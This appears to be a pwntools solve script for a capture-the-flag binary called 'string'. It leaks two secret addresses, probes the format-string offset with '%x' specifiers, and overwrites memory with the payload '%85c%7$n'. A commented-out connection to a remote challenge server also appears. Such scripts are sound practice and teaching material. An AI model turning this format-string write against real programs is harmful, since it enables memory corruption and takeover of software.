from pwn import *

e = ELF("./string")
#p = process("./string")
#p = remote("111.198.29.45",49745)

#for symbol in e.symbols:
#	print symbol, hex(e.symbols[symbol])
''' # check offset format string
i = 1

while 1:
	p = process("./string")
	print p.recv()
	p.sendline("bach")
	print p.recv()
	p.sendline("east")
	print p.recv()
	p.sendline("1")
	print p.recv()
	p.sendline("AAAA.%"+str(i)+"$x")
	print p.recv()
	log.info(str(i))
	sleep(1)
	i = i+1
'''

p = process("./string")
context.log_level = 'DEBUG'
gdb.attach(p)
print p.recvuntil("secret[0] is ")
secret_0 = "0x"+p.recv(7)
print secret_0
print p.recvuntil("secret[1] is ")
secret_1 = "0x"+p.recv(7)
print secret_1
print p.recv()
p.sendline("bach")
print p.recv()
p.sendline("east")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline(p64(int(secret_0, 16)))
print p.recv()
p.sendline("%85c%7$n")
#payload = p64(int(secret_0, 16)) + p64(int(secret_1, 16)) + "%8$n"+ "%6$n"+ "%7$n"+ "%9$n"+ "%10$n" 
#p.sendline(payload)

p.interactive()
